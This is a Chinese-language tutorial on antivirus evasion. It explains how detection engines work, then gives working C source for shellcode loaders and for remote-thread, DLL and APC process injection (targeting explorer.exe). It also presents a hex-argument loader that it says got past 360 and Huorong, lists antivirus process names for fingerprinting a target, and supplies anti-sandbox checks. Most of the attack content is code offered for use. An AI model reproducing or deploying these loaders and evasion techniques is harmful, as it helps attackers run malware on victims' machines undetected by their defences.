## **0x01、杀软查杀原理**

###  **1、免杀的概念**

免杀，也就是反病毒(AntiVirus)与反间谍(AntiSpyware)的对立面，英文为Anti-AntiVirus（简写Virus
AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。 也就是我们常说的bypass AV

###  **2、杀软的分类**

  1. 免费版，对所有用户开放，例如：360安全卫士、360杀毒、火绒、电脑管家等等
  2. 企业版，也是收费版，我们把他称为EDR，对比免费版，查杀更加严格，特别是针对于内存的查杀，比如：卡巴斯基、ESET(NOD32)等等

###  **3、杀软检测方式**

 **扫描技术**

  1. 扫描压缩包技术；对压缩文件进行分析检查的技术
  2. 程序防窜改防护；保护程序避免被恶意程序修改
  3. 修复技术；对恶意程序所破坏的文件还原
  4. 智能扫描；扫描常用磁盘，系统关键位置，时间短
  5. 全盘扫描；扫描电脑全盘文件，时间长
  6. 勒索软件防护；保护电脑不受勒索软件的攻击
  7. 开机扫描；电脑开机时自动扫描，可以扫描压缩文档和不需要的程序

 **监控技术**

  1. 内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存的网络数据。
  2. 文件监控：当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警
  3. 邮件监控：当发现电子邮件的附件存在病毒时进行拦截。office钓鱼 宏病毒 这种
  4. 网页防护：阻止网络攻击和不安全下载。 mshta js脚本
  5. 行为防护：提醒用户可疑的应用程序行为。低危 和中

 **云查杀** （实质就是病毒库由客户端移至服务端，一般分为两种情况，例如360）

  1. 客户端提取特征上传，在云端检测到对应特征所标明的是否病毒状态，并返回
  2. 客户端上传特征，在云端无法检测到，则上传文件，文件通过杀软系统进行评判，得出总评分，对于无结果的，进行鉴定系统评分，总共得出结果返回给用户，并入云端库
  3. 云查杀的特点基本也可以概括为特征查杀。

###  **4、扫描引擎**

 **特征码扫描**

**机制：将扫描信息与病毒数据库进行对比，病毒库是一直更新的，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销。

 **特征码识别：**

  1. 文件特征码：对付病毒在文件中的存在方式：单一文件特征码、复合文件特征码（通过多处特征进行判断）；
  2. 内存特征码：对付病毒在内存中的存在方式：单一内存特征码、复合内存特征码优点：速度快，配备高性能的扫描引擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与。

 **文件效验和法**

对文件进行扫描后，可以将正常文件的内容，计算其校验和，将该校验和写入文件中或写入别的文件中保存；在文件使用过程中，定期地或每次使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，因而可以发现文件是否感染病毒。

 **进程行为检测（沙盒模式）VT**

**行为检测通过hook关键api，以及对各个高危的文件、组件做监控防止恶意程序对系统修改。只要恶意程序对注册表、启动项、系统文件等做操作就会触发告警。最后，行为检测也被应用到了沙箱做为动态检测，对于避免沙箱检测的办法有如下几个：**

  * 延时执行，部分沙箱存在运行时间限制
  * 沙箱检测，对诸如硬盘容量、内存、虚拟机特征做检测
  * 部分沙箱会对文件重命名，可以检测自身文件名是否被更改

 **主动防御**

 **主动防御并不需要病毒特征码支持，只要杀毒软件能分析并扫描到目标程序的行为，并根据预先设定的规则，判定是否应该进行清除操作 参考360的主动防御**

##  **0x02 常见的绕过技术**

 **经典技术**

  *  **特征码免杀**
  *  **花指令免杀**
  *  **加壳免杀**
  *  **内存免杀**
  *  **分离免杀**
  *  **资源修改**
  *  **白名单免杀**

 **1、修改特征**

一个加载器存在两个明显的特征，一个是shellcode和硬编码字符串。我们需要消除这些特征，比较方便使用一个简单的异或加密就能消除shellcode的特征。第二个是加载器的关联特征也需要消除，通过加入无意义的代码干扰反病毒引擎。

 **2、花指令免杀**

花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。

 **3、加壳免杀**

简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。加壳虽然对于特征码绕过有非常好的效果，加密壳基本上可以把特征码全部掩盖，但是缺点也非常的明显，因为壳自己也有特征，主流的壳如VMP,
Themida等等。

 **4、内存免杀**

shellcode直接加载进内存，避免文件落地，可以绕过文件扫描。但是针对内存的扫描还需对shellcode特征做隐藏处理。对windows来说，新下载的文件和从外部来的文件，都会被windows打上标记，会被优先重点扫描。而无文件落地可以规避这一策略。同时申请内存的时候采用渐进式申请，申请一块可读写内存，再在运行改为可执行。最后，在执行时也要执行分离免杀的策略。

 **5、分离免杀**

即ShellCode和加载器分离。各种语言实现的都很容易找到，虽然看起来比较简单，但效果却是不错的。比如可以远程读取png中的shellcode。

 **6、资源修改**

杀软在检测程序的时候会对诸如文件的描述、版本号、创建日期作为特征检测，可用restorator对目标修改资源文件。比如：加资源、替换资源、加签名等等

 **7、白名单免杀**

利用一些系统自带的白程序加载payload，例如powershell、mshta等等...

##  **0x03 什么是shellcode？**

**shellcode是一小段代码，用于利用软件漏洞作为有效载荷。它之所以被称为“shellcode”，是因为它通常启动一个命令shell，攻击者可以从这个命令shell控制受损的计算机，但是执行类似任务的任何代码都可以被称为shellcode。因为有效载荷（payload）的功能不仅限于生成shell**

 **简单来说：shellcode就是汇编，16进制**

例如，CS可以直接生成各种格式的shellcode

![wKg0C2IuktKAPQEtAAC4pTgW4RY401.png](https://image.3001.net/images/20220801/1659339080_62e78148c13b19d05d687.png!small)

##  **0x04、shellcode免杀思路**

  1. shellcode 字符串 加密处理 加密代码 解密代码 aes
  2. 添加无危害的代码执行流程扰乱杀软分析 比如延迟执行代码 绕过沙箱
  3. 分离免杀

##  **0x05 常见杀软进程**

常用命令 **tasklist /SVG**

 **国内杀软:**

360全家桶、腾讯管家、火绒安全软件、安全狗、金山毒霸、电脑管家、瑞星等等...

 **国外杀软:**

卡巴斯基、AVAST、AVG、科摩多、火眼、诺顿、nod32、小红伞等

 **通过查看进程识别目标机器的杀软类型**

****360全家桶：360tray.exe、360safe.exe、360ZhuDongFangYu.exe、360sd.exe

 **火绒** ：hipstray.exe、wsctrl.exe、usysdiag.exe

 **安全狗**
：SafeDogGuarsdCenter.exe、safedogupdatecenter.exe、safedogguardcenter.exe

 **瑞星** ：rstray.exe、ravmond.exe、rsmain.exe

 **卡巴斯基** ：AVP.EXE

 **小红伞** ：avfwsvc.exe、avgnt.exe、avguard.exe、avmailc.exe、avshadow.exe

 **NOD32** ：egui.exe、eguiProxy.exe、ekrn.exe

其他的一些杀软的进程，我们可以参考`avList`项目

<https://github.com/wgetnz/avList>  

##  **0x06、几种常见的shellcode执行方式**

###  **1、指针执行**

最常见的一种加载shellcode的方法，使用指针来执行函数

    
    
    #include <Windows.h>
    #include <stdio.h>
    
    unsigned char buf[] =
    "你的shellcode";
    
    #pragma comment(linker, "/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
    //windows控制台程序不出黑窗口
    int main()
    {
      
        ((void(*)(void)) & buf)();
    }
    

**VT查杀率 26/68**

![wKg0C2IulCiAQnmpAAC1zPZ9YRM663.png](https://image.3001.net/images/20220801/1659339081_62e781496075b613234c5.png!small)

###  **2、申请动态内存加载**

申请一段动态内存，然后把shellcode放进去，随后强转为一个函数类型指针，最后调用这个函数

    
    
    #include <Windows.h>
    #include <stdio.h>
    #pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
    //windows控制台程序不出黑窗口
    
    int main()
    {
        char shellcode[] = "你的shellcode";
        
        void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shellcode, sizeof shellcode);
        ((void(*)())exec)();
    }
    

**VT查杀率 19/68，比指针执行稍微要好一点**

![wKg0C2IulCAenwyAACnrYyqac716.png](https://image.3001.net/images/20220801/1659339081_62e78149ece66d235f017.png!small)

### 3、嵌入汇编加载 x86 x64 肯定x86

    
    
    #include <windows.h>
    #include <stdio.h>
    #pragma comment(linker, "/section:.data,RWE")
    #pragma comment(linker, "/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
    //windows控制台程序不出黑窗口
    
    unsigned char shellcode[] = "你的shellcode";
    void main()
    {
        __asm
        {
    
            mov eax, offset shellcode
            jmp eax
        }
    }
    

**VT查杀率 29/67**

![wKg0C2IulDWAXGqVAACvX2t75g859.png](https://image.3001.net/images/20220801/1659339082_62e7814a7a09c341c6757.png!small)

### 4、强制类型转换

    
    
    #include <windows.h>
    #include <stdio.h>
    
    #pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
    //windows控制台程序不出黑窗口
    
    unsigned char buff[] = "你的shellcode";
    
    void main()
    {
        ((void(WINAPI*)(void)) & buff)();
    }
    

**VT查杀率 29/67**

![wKg0C2IulDuACSLwAACVvbvgWYo825.png](https://image.3001.net/images/20220801/1659339083_62e7814b02c2bb464bc37.png!small)

##  **5、汇编花指令**

 **和方法3差不多**

    
    
    #include <windows.h>
    #include <stdio.h>
    #pragma comment(linker, "/section:.data,RWE")
    #pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
    //windows控制台程序不出黑窗口
    
    unsigned char xff[] = "你的shellcode";
    void main()
    {
        __asm
        {   
            mov eax, offset xff;
            _emit 0xFF;
            _emit 0xE0;
        }
    }
    

**VT查杀率 28/66**

![wKg0C2IulEKAIlptAACT7K0deQ162.png](https://image.3001.net/images/20220801/1659339083_62e7814b7318636bf0676.png!small)

 **以上五种是最常见的免杀方法，可见其效果不是很好。**

##  **0x07、其他一些执行shellcocd的方法**

###  **1、远程线程注入**

使用远程线程注入，我们需要使用4个主要函数： **OpenProcess, VirtualAllocEx,
WriteProcessMemory，CreateRemoteThread** ，在MSDN中我们可以函数的具体用法

 **那么我们的整体思路就是**

  1.  **打开远程进程的句柄（Pid）**
  2.  **使用VirtualAllocEx在远程进程中分配具有读、写和执行必要权限的内存空间**
  3.  **然后使用WriteProcessMemory将shellcode写入到内存缓冲区中**
  4.  **最后通过调用CreateRemoteThread来创建线程，其中将指向程序集存根的指针作为要执行的函数，将指向远程shellcode的指针作为自变量**

 **最后的demo代码如下：**

    
    
    #include "Windows.h"
    #include <stdio.h>
    
    int main(int argc, char* argv[])
    {
        unsigned char shellcode[] ="你的shellcode";
    
        HANDLE processHandle;
        HANDLE remoteThread;
        PVOID remoteBuffer;
    
        printf("Injecting to PID: %i", atoi(argv[1]));
        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
        remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
        CloseHandle(processHandle);
    
        return 0;
    }
    

## **2、经典Dll注入**

经典DLL注入到远程进程中，根据上面远程进程注入的知识，写出简单的demo

    
    
    #include "Windows.h"
    #include <stdio.h>
    
    
    int main(int argc, char* argv[]) {
        HANDLE processHandle;
        PVOID remoteBuffer;
        wchar_t dllPath[] = TEXT("你的DLL地址");
    
        printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
        remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
        PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
        CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
        CloseHandle(processHandle);
    
        return 0;
    }
    

### **3、资源加载shellcode**

在解决方案中直接添加资源文件，并对资源文件进行一个命名，我们需要记住这个资源的名字，然后使用**`FindResource`**来调用他

 **加载shellcode代码如下：**

    
    
    #include "pch.h"
    #include <iostream>
    #include <Windows.h>
    #include "resource.h"
    
    int main()
    {
        // IDR_METERPRETER_BIN1 - 资源ID 包含shellcode 
        // METERPRETER_BIN 是我们嵌入资源时选择的资源类型名称
        HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDR_METERPRETER_BIN1), L"METERPRETER_BIN");
        DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
        HGLOBAL shellcodeResouceData = LoadResource(NULL, shellcodeResource);
    
        void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, shellcodeResouceData, shellcodeSize);
        ((void(*)())exec)();
    
        return  0;
    }
    

### **4、APC注入**

APC注入可以让一个线程在它正常的执行路径运行之前执行一些其它的代码，每一个线程都有一个附加的APC队列，它们在线程处于可警告的时候才被处理(WaitForSingObjectEx,SleepEx)。

如果程序在线程可警告等待状态时候排入一个APC队列，那么线程将开始执行APC函数，恶意代码则可以设置APC函数抢占可警告等待状态的线程。

 **APC有两中存在形式：**

  1. 为系统和驱动生成的APC(内核APC)
  2. 为应用程序生成的APC(用户APC)

 **用户模式**

线程可利用QueueUserAPC排入一个让远程线程调用的函数，QueueUserAPC函数原型（MSDN):

    
    
    DWORD QueueUserAPC(
      PAPCFUNC pfnAPC,      //指向一个用户提供的APC函数的指针(当指定线程执行可告警的等待时，将调用指向应用程序提供的APC函数的指针)
      HANDLE   hThread,     //线程的句柄。句柄必须有THREAD_SET_CONTEXT访问权限
      ULONG_PTR dwData      //指定一个被传到pfnAPC参数指向的APC函数的值
    
    

一旦获取了线程ID，就可以利用其打开句柄，通过参数LoadLibraryA以及对应的参数dwData(dll名称)，LoadLibraryA就会被远程线程调用，从而加载对应的恶意DLL。

 **内核模式**

一种方法是在内核空间执行APC注入。恶意的驱动可创建一个APC,然后分配用户模式进程中的一个线程（最常见的是svchost.exe)运行它。这种类型的APC通常由shellcode组成。

 **设备驱动利用两个主要的函数来使用APC:KeInitalizeApc和KeInsertQueueApc。**

需要两个函数来搭配使用，构造APC函数。

  * KeInitalizeApc(初始化APC结构)
  * KelnsertQueueAPC(将APC对象放入目标线程的APC队列中）

 **KeInitalizeApc函数原型：**

    
    
    KeInitializeApc(Apc,
                        &Thread->Tcb, //KTHREAD
                        OriginalApcEnvironment,//这个参数包含要被注入的线程
                        PspQueueApcSpecialApc,
                        NULL,
                        ApcRoutine,
                        UserMode,  //**
                        NormalContext); //**
    
    

下面，我们利用APC注入来执行shellcode，那么我们的总体思路就是

  1. 查找explorer.exe进程ID
  2. 在explorer.exe进程的内存空间中分配内存
  3. 将shellcode下入该内存位置
  4. 在explorer.exe中找到所有线程
  5. 将APC排队到所有这些线程中，APC指向shellcode
  6. 当explorer.exe中的线程被调用时，我们的shellcode将被执行

找到要注入的进程并调用：`explorer.exe，Process32First，Process32Next`

    
    
    if (Process32First(snapshot, &processEntry)) {
        while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
            Process32Next(snapshot, &processEntry);
        }
    }
    

找到explorer的PID后，我们需要获取explorer.exe进程的句柄并且为shellcode分配一些内存，该shellcode会被写入资源管理器的进程内存空间，此外，声明一个APC例程，该例程现在执行该shellcode

    
    
    victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
    

接着，我们开始枚举 explorer.exe的所有线程，并将APC指向shellcode

    
    
    if (Thread32First(snapshot, &threadEntry)) {
        do {
            if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                threadIds.push_back(threadEntry.th32ThreadID);
            }
        } while (Thread32Next(snapshot, &threadEntry));
    }
      
    for (DWORD threadId : threadIds) {
        threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
        QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
        Sleep(1000 * 2);
    }
    

上面我们说到了只有线程处于可警告的时候才被处理，为了使APC代码注入能够正常工作，排队APC的线程需要处于某种状态。

    
    
    DWORD SleepEx(
      DWORD dwMilliseconds,
      BOOL  bAlertable
    );
    

处于可警告状态代码立即被执行，处于不可警告状态，shellcode没有得到执行。

由此我们的完整代码如下

    
    
    #include "pch.h"
    #include <iostream>
    #include <Windows.h>
    #include <TlHelp32.h>
    #include <vector>
    
    int main()
    {
        unsigned char buf[] = "你的shellcode";
    
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
        HANDLE victimProcess = NULL;
        PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
        THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
        std::vector<DWORD> threadIds;
        SIZE_T shellSize = sizeof(buf);
        HANDLE threadHandle = NULL;
    
        if (Process32First(snapshot, &processEntry)) {
            while (_wcsicmp(processEntry.szExeFile, L"explorer.exe") != 0) {
                Process32Next(snapshot, &processEntry);
            }
        }
      
        victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
        LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
        WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
    
        if (Thread32First(snapshot, &threadEntry)) {
            do {
                if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
                    threadIds.push_back(threadEntry.th32ThreadID);
                }
            } while (Thread32Next(snapshot, &threadEntry));
        }
      
        for (DWORD threadId : threadIds) {
            threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
            QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
            Sleep(1000 * 2);
        }
      
        return 0;
    }
    

## **0x08 、编写免杀Loader**

上面几种方式的免杀效果不是特别好，因为我们没有对shellcode进行任何处理，我们可以根据上面我们提到的shellcode免杀思路，我们对shellcode进行编码或者分离免杀。这里我们直接编写一个分离免杀的加载器

###  **分离免杀Loader编写**

我们需要对shellcode进行hex编码，Loader通过参数的方式传递hex编码的shellcode到加载器，然后还原shellcode，这里需要注意：

比如数组长度是892，那么他就是由shellcode[0]到shellcode[891]构成，后面加上一个终止符，此时strlen (shellcode)
= 892，sizeof (shellcode) = 893,所以计算长度的时候需要 a= (sizeof(shellcode)
-1)，因为每两个字节为一组，所以我们在分配内存时，需要进行除二操作，比如bytes = (sizeof(shellcode) - 1)/2 或者
bytes = strlen(shellcode)/2

还原shellcode

    
    
    for(unsigned int i = 0; i< iterations-1; i++) {
            sscanf(shellcode+2*i, "%2X", &char_in_hex);
            shellcode[i] = (char)char_in_hex;
       }
    

加载方式

    
    
    typedef void (*some_func)();
       some_func func = (some_func)exec;
       func();
    

对于shellcode的转换，大家自行用python写个小脚本即可，或者使用K8飞刀进行转换

![wKg0C2Iul82AMRO7AAEnpkPdus8307.png](https://image.3001.net/images/20220801/1659339083_62e7814be024eb9ae79bf.png!small)

把我们的加载器，丢到装了360和火绒的环境中，上线和执行命令均没有任何问题

![wKg0C2IunhOAWrTzAACGm8KqwE968.png](https://image.3001.net/images/20220801/1659339084_62e7814c95a088913d9b5.png!small)

![wKg0C2IunhuAP8VZAADMLSJNXBM838.png](https://image.3001.net/images/20220801/1659339085_62e7814d085738499635a.png!small)

完整代码如下

    
    
    #include <stdio.h>
    #include <Windows.h>
    
    int main(int argc, char *argv[]) {
    
    
    unsigned int char_in_hex;
    
    
    char *shellcode = argv[1];
    unsigned int iterations = strlen(shellcode);
    
    
    
    unsigned int memory_allocation = strlen(shellcode) / 2; 
    
    
    for (unsigned int i = 0; i< iterations - 1; i++) {
    sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
    shellcode[i] = (char)char_in_hex;
    }
    
    void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
    
    typedef void(*some_one)();
    some_one func = (some_one)exec;
    func();
    
    return 0;
    }
    

## **0x09、关于反沙箱**

 **由于沙箱环境的资源有限，他们可能会将运行的进程数量限制到最小，这里代码的意思是用户在任何时候都至少有50个进程在运行。**

    
    
    DWORD runningProcessesIDs[1024];
    DWORD runningProcessesCountBytes;
    DWORD runningProcessesCount;
    EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
    runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
    if (runningProcessesCount < 50) return false;
    

**判断正常运行时间**

    
    
    ULONGLONG uptime = GetTickCount64() / 1000;
    if (uptime < 1200) return false; //20 分钟
    

**检测计算机名和用户名，默认机器名称都是遵循**`DESKTOP-[0-9A-Z]{7}`
**(或其他具有随机字符的类似模式)，我们可以将这些名称与已知的字符串进行比较**

    
    
    //检查计算机名
    DWORD computerNameLength = MAX_COMPUTERNAME_LENGTH;
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    GetComputerNameW(computerName, &computerNameLength);
    CharUpperW(computerName);
    if (wcsstr(computerName, L"DESKTOP-")) return false;
    
    //检查用户名
    DWORD userNameLength = UNLEN;
    wchar_t userName[UNLEN + 1];
    GetUserNameW(userName, &userNameLength);
    CharUpperW(userName);
    if (wcsstr(userName, L"ADMIN")) return false;﻿

